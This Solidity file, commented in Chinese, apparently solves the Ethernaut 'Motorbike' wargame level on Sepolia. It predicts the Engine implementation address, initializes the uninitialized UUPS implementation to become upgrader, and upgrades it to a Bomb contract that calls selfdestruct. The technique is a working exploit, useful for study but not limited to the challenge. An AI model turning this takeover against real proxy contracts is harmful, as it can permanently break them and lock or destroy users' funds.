// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./MotorbikeUtils.sol";

// 這是我們要用來炸掉 Engine 的自殺炸彈
contract Bomb {
    function explode() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeExploit is AddressHelper {
    address public immutable owner;
    address public immutable bomb; // 儲存炸彈地址
    
    // Sepolia Ethernaut Addresses
    address constant ethernaut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address constant motorbikeLevel = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    
    address engine;
    address public motorbike;

    constructor() {
        owner = msg.sender;
        // 部署炸彈合約備用
        bomb = address(new Bomb());
    }

    // 這就是我們的 EOA (透過 EIP-7702) 會執行的函式
    function solve(uint256 nonce) public {
        require(msg.sender == owner, "Only owner");

        // 1. 呼叫 Ethernaut 創建新實例
        // (因為我們在同一筆交易中，所以我們需要預測它會生成在哪裡)
        createLevelInstance();

        // 2. 預測 Engine 的地址
        // createLevelInstance 內部會先部署 Engine (nonce)，然後部署 Proxy (nonce+1)
        // 所以傳入的 nonce 應該是當前 MotorbikeLevel 合約的 nonce
        engine = computeCreateAddress(motorbikeLevel, nonce);
        motorbike = computeCreateAddress(motorbikeLevel, nonce + 1);

        // 3. 執行自殺攻擊
        selfdestructEngine(Engine(engine));
    }

    function createLevelInstance() internal {
        (bool success,) = ethernaut.call(abi.encodeWithSignature("createLevelInstance(address)", motorbikeLevel));
        require(success, "Failed to create level instance");
    }

    function selfdestructEngine(Engine e) internal {
        // 初始化 Engine (因為是直接對 Implementation 呼叫，storage 是空的，我們可以成為 upgrader)
        e.initialize();
        // 升級成炸彈並引爆
        // 這會讓 Engine delegatecall 到 Bomb.explode()，觸發 selfdestruct
        e.upgradeToAndCall(bomb, abi.encodeWithSignature("explode()"));
    }
}
